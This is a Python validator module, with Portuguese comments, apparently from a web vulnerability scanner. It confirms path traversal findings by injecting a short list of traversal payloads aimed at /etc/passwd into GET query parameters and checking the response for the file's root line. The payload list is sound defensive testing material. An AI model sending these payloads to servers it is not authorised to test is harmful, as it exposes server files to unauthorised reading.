"""Path traversal: um parâmetro permite ler arquivos do servidor saindo do diretório esperado.

Prova não destrutiva e mínima: injeta caminhos para um arquivo de sistema universal e benigno
(`/etc/passwd`, só leitura) e confirma só se a resposta traz a assinatura dele (`root:...:0:0:`).
Nada é alterado; lemos o mínimo para provar (uma linha conhecida), não dados do aplicativo.
"""

from __future__ import annotations

import re

from scanner.common.models import Finding, Outcome, Validation
from scanner.validation.http import ProbeClient
from scanner.validation.validators.base import (
    is_query_param,
    proof_from,
    register,
    result,
    with_param,
)

NAME = "path_traversal"

# Primeira linha do /etc/passwd em qualquer Unix: usuário root com uid/gid 0.
PASSWD_RE = re.compile(r"root:.*:0:0:")

PAYLOADS: tuple[str, ...] = (
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
)


@register(NAME, zap_rules=("6",), cwes=(22,))
def validate(
    f: Finding, client: ProbeClient, payloads: tuple[str, ...] | None = None
) -> Validation:
    url, param = f.location.url, f.location.parameter
    if f.location.method != "GET" or not is_query_param(url, param):
        return result(
            NAME, Outcome.UNCONFIRMED, "prova automática só para parâmetros de query em GET"
        )
    assert param is not None
    for payload in payloads or PAYLOADS:
        probe = with_param(url, param, payload)
        resp = client.request("GET", probe)
        if resp.status == 200 and PASSWD_RE.search(resp.text):
            proof = proof_from("GET", probe, resp, "root:", "conteúdo de /etc/passwd retornado")
            return result(
                NAME,
                Outcome.CONFIRMED,
                f"o parâmetro '{param}' permite ler arquivos do servidor (path traversal)",
                proof,
            )
    return result(NAME, Outcome.UNCONFIRMED, "o parâmetro não retornou um arquivo do sistema")
